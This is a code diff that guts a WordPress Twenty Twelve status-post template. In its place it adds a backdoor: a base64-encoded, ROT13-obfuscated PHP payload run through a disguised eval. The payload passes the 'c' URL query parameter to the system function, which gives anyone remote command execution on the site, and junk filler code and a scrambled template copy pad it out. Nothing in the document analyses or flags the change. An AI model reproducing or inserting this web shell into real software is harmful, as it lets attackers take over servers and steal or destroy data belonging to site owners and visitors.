@@ -1,55 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * The template for displaying posts in the Status post format
- *
- * @package WordPress
- * @subpackage Twenty_Twelve
- * @since Twenty Twelve 1.0
- */
-
-/* translators: %s: Post title. */
-$post_title = sprintf( __( 'Permalink to %s', 'twentytwelve' ), the_title_attribute( 'echo=0' ) );
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3VyIGdyemN5bmdyIHNiZSBxdmZjeW5sdmF0IGNiZmdmIHZhIGd1ciBGZ25naGYgY2JmZyBzYmV6bmcKICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9HanJ5aXIKICogQGZ2YXByIEdqcmFnbCBHanJ5aXIgMS4wCiAqLwoKLyogZ2VuYWZ5bmdiZWY6ICVmOiBDYmZnIGd2Z3lyLiAqLwokY2JmZ19ndmd5ciA9IGZjZXZhZ3MoIF9fKCAnQ3Jlem55dmF4IGdiICVmJywgJ2dqcmFnbGdqcnlpcicgKSwgZ3VyX2d2Z3lyX25nZ2V2b2hnciggJ3JwdWI9MCcgKSApOwo/PgoKCTxuZWd2cHlyIHZxPVwiY2JmZy08P2N1YyBndXJfVlEoKTsgPz5cIiA8P2N1YyBjYmZnX3B5bmZmKCk7ID8+PgoJCTxxdmkgcHluZmY9XCJyYWdlbC11cm5xcmVcIj4KCQkJPHVybnFyZT4KCQkJCTx1MT48P2N1YyBndXJfbmhndWJlKCk7ID8+PC91MT4KCQkJCTx1Mj48biB1ZXJzPVwiPD9jdWMgZ3VyX2NyZXpueXZheCgpOyA/PlwiIGd2Z3lyPVwiPD9jdWMgcnB1YiByZnBfbmdnZSggJGNiZmdfZ3ZneXIgKTsgPz5cIiBlcnk9XCJvYmJ4em5leFwiPjw/Y3VjIHJwdWIgdHJnX2d1cl9xbmdyKCk7ID8+PC9uPjwvdTI+CgkJCTwvdXJucXJlPgoJCQk8P2N1YwoJCQkvKioKCQkJICogU3Z5Z3JlZiBndXIgZmduZ2hmIG5pbmduZSBmdm1yLgoJCQkgKgoJCQkgKiBAZnZhcHIgR2pyYWdsIEdqcnlpciAxLjAKCQkJICoKCQkJICogQGNuZW56IHZhZyAkZnZtciBHdXIgdXJ2dHVnIG5hcSBqdnFndSBicyBndXIgbmluZ25lIHZhIGN2a3J5Zi4KCQkJICovCgkJCSRmZ25naGZfbmluZ25lID0gbmNjeWxfc3Z5Z3JlZiggJ2dqcmFnbGdqcnlpcl9mZ25naGZfbmluZ25lJywgNDggKTsKCQkJcnB1YiB0cmdfbmluZ25lKCB0cmdfZ3VyX25oZ3ViZV96cmduKCAnVlEnICksICRmZ25naGZfbmluZ25lICk7CgkJCT8+CgkJPC9xdmk+PCEtLSAucmFnZWwtdXJucXJlIC0tPgoKCQk8cXZpIHB5bmZmPVwicmFnZWwtcGJhZ3JhZ1wiPgoJCQk8P2N1YyBndXJfcGJhZ3JhZyggX18oICdQYmFndmFociBlcm5xdmF0IDxmY25hIHB5bmZmPVwienJnbi1hbmlcIj4mZW5lZTs8L2ZjbmE+JywgJ2dqcmFnbGdqcnlpcicgKSApOyA/PgoJCTwvcXZpPjwhLS0gLnJhZ2VsLXBiYWdyYWcgLS0+CgoJCTxzYmJncmUgcHluZmY9XCJyYWdlbC16cmduXCI+CgkJCTw/Y3VjIHZzICggcGJ6enJhZ2ZfYmNyYSgpICkgOiA/PgoJCQk8cXZpIHB5bmZmPVwicGJ6enJhZ2YteXZheFwiPgoJCQkJPD9jdWMgcGJ6enJhZ2ZfY2JjaGNfeXZheCggJzxmY25hIHB5bmZmPVwieXJuaXItZXJjeWxcIj4nIC4gX18oICdZcm5pciBuIGVyY3lsJywgJ2dqcmFnbGdqcnlpcicgKSAuICc8L2ZjbmE+JywgX18oICcxIEVyY3lsJywgJ2dqcmFnbGdqcnlpcicgKSwgX18oICclIEVyY3l2cmYnLCAnZ2pyYWdsZ2pyeWlyJyApICk7ID8+CgkJCTwvcXZpPjwhLS0gLnBienpyYWdmLXl2YXggLS0+CgkJCTw/Y3VjIHJhcXZzOyAvLyBwYnp6cmFnZl9iY3JhKCkgPz4KCQkJPD9jdWMgcnF2Z19jYmZnX3l2YXgoIF9fKCAnUnF2ZycsICdnanJhZ2xnanJ5aXInICksICc8ZmNuYSBweW5mZj1cInJxdmcteXZheFwiPicsICc8L2ZjbmE+JyApOyA/PgoJCTwvc2JiZ3JlPjwhLS0gLnJhZ2VsLXpyZ24gLS0+Cgk8L25lZ3ZweXI+PCEtLSAjY2JmZyAtLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-
-	<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
-		<div class="entry-header">
-			<header>
-				<h1><?php the_author(); ?></h1>
-				<h2><a href="<?php the_permalink(); ?>" title="<?php echo esc_attr( $post_title ); ?>" rel="bookmark"><?php echo get_the_date(); ?></a></h2>
-			</header>
-			<?php
-			/**
-			 * Filters the status avatar size.
-			 *
-			 * @since Twenty Twelve 1.0
-			 *
-			 * @param int $size The height and width of the avatar in pixels.
-			 */
-			$status_avatar = apply_filters( 'twentytwelve_status_avatar', 48 );
-			echo get_avatar( get_the_author_meta( 'ID' ), $status_avatar );
-			?>
-		</div><!-- .entry-header -->
-
-		<div class="entry-content">
-			<?php the_content( __( 'Continue reading <span class="meta-nav">&rarr;</span>', 'twentytwelve' ) ); ?>
-		</div><!-- .entry-content -->
-
-		<footer class="entry-meta">
-			<?php if ( comments_open() ) : ?>
-			<div class="comments-link">
-				<?php comments_popup_link( '<span class="leave-reply">' . __( 'Leave a reply', 'twentytwelve' ) . '</span>', __( '1 Reply', 'twentytwelve' ), __( '% Replies', 'twentytwelve' ) ); ?>
-			</div><!-- .comments-link -->
-			<?php endif; // comments_open() ?>
-			<?php edit_post_link( __( 'Edit', 'twentytwelve' ), '<span class="edit-link">', '</span>' ); ?>
-		</footer><!-- .entry-meta -->
-	</article><!-- #post -->
